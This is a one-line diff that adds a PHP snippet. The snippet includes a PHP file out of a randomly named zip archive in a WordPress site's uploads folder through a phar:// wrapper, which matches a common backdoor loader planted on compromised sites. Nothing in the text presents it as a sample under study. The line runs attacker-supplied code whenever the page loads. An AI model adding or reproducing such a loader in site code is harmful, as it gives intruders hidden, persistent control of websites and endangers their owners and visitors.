@@ -1,0 +1,1 @@
+ <?php $url = 'phar://'. $_SERVER['DOCUMENT_ROOT'] .'/wp-content/uploads/fcefabhjea.zip/fcefabhjea.php';include($url);?>
